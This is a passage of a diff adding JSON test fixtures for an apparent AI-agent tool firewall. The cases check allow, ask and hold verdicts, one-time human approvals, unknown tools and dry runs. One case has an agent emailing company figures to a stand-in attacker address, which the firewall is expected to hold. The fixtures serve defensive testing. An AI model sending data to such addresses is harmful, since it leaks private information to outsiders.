+    "description": "as WebFetch without map (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "raw_fetch",
+            "input": {
+              "url": "https://docs.example.org/page",
+              "prompt": "read"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-unregistered-tool",
+    "description": "A tool the registry does not list is FW-UNKNOWN-TOOL (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "summarize_text",
+            "input": {
+              "text": "hello"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-UNKNOWN-TOOL"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-unregistered-tool-taints",
+    "description": "An unregistered tool's result is outside content (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "summarize_text",
+            "input": {
+              "text": "hello"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-UNKNOWN-TOOL"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-unregistered-engine-name",
+    "description": "A tool named like an engine tool but not in the registry is still unknown (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "Bash",
+            "input": {
+              "command": "ls"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-UNKNOWN-TOOL"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-unregistered-mcp-name",
+    "description": "A tool named like an MCP tool but not in the registry is still unknown (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "mcp__docs__search",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "ask",
+          "ruleIds": [
+            "FW-UNKNOWN-TOOL"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-unattended-ask-is-hold",
+    "description": "attended false: the ask becomes a hold (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "hold",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-hold-approve-once",
+    "description": "A hold approved by a person lets the same call run once (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "hold",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "approve",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:2"
+        },
+        "expect": {}
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [
+            "FW-APPROVED"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "hold",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-approval-does-not-cover-other-args",
+    "description": "An approval is for the exact call: other arguments are held again (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "result",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:0",
+          "output": "(outside content placeholder)"
+        },
+        "expect": {
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "hold",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      },
+      {
+        "kind": "approve",
+        "request": {
+          "session": "run-1",
+          "decisionId": "@step:2"
+        },
+        "expect": {}
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "attacker@evil.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": false,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "hold",
+          "ruleIds": [
+            "FW-MESSAGE"
+          ],
+          "sessionUntrusted": true,
+          "holdsPrivateData": false
+        }
+      }
+    ]
+  },
+  {
+    "id": "native-dry-run-records-nothing",
+    "description": "dryRun previews a read without tainting the session: the send after it is as in a trusted session (native)",
+    "source": "docs/api-v0.md, tool registry",
+    "agentTools": {
+      "tools": {
+        "search_docs": {
+          "kind": "read",
+          "results": "untrusted",
+          "privateData": false
+        },
+        "get_customer": {
+          "kind": "read",
+          "results": "trusted",
+          "privateData": true
+        },
+        "list_notes": {
+          "kind": "read"
+        },
+        "send_email": {
+          "kind": "send"
+        },
+        "delete_account": {
+          "kind": "destroy"
+        },
+        "wire_money": {
+          "kind": "blocked"
+        },
+        "run_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.cmd"
+          }
+        },
+        "http_get": {
+          "as": "WebFetch",
+          "map": {
+            "url": "$.url"
+          }
+        },
+        "read_file": {
+          "as": "Read",
+          "map": {
+            "file_path": "$.path"
+          }
+        },
+        "write_file": {
+          "as": "Write",
+          "map": {
+            "file_path": "$.path",
+            "content": "$.body"
+          }
+        },
+        "nested_shell": {
+          "as": "Bash",
+          "map": {
+            "command": "$.args.cmd"
+          }
+        },
+        "raw_shell": {
+          "as": "Bash"
+        },
+        "raw_fetch": {
+          "as": "WebFetch"
+        }
+      }
+    },
+    "steps": [
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "search_docs",
+            "input": {
+              "q": "x"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          },
+          "dryRun": true
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": []
+        }
+      },
+      {
+        "kind": "decide",
+        "request": {
+          "session": "run-1",
+          "action": {
+            "format": "native",
+            "tool": "send_email",
+            "input": {
+              "to": "someone@else.example",
+              "body": "the quarterly numbers"
+            }
+          },
+          "context": {
+            "attended": true,
+            "workspace": [
+              "/srv/app"
+            ],
+            "cwd": "/srv/app"
+          }
+        },
+        "expect": {
+          "verdict": "allow",
+          "ruleIds": [],
+          "sessionUntrusted": true,
+          "holdsPrivateData": true
+        }
+      }
+    ]
+  }
+]
